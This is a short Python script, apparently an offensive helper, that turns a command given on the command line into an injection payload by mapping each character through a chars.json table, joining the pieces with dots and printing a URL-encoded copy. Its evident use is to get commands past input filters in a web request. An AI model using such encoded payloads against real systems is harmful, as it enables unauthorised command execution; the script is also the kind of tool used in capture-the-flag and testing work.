#!/usr/bin/env python3

import json
import sys
import urllib.parse

if len(sys.argv) - 1 < 1:
    print('A command must be specified')
    exit(1)

payload = ''

with open('./chars.json') as chars_file:
    chars = json.load(chars_file)
    
    for index, char in enumerate(sys.argv[1]):
        if index != 0:
            payload += '.'
          
        payload += chars[char]
        payload += ''

    print(f"Payload:\n({payload})")
    print(f"URL Encoded:\n({urllib.parse.quote(payload)})")
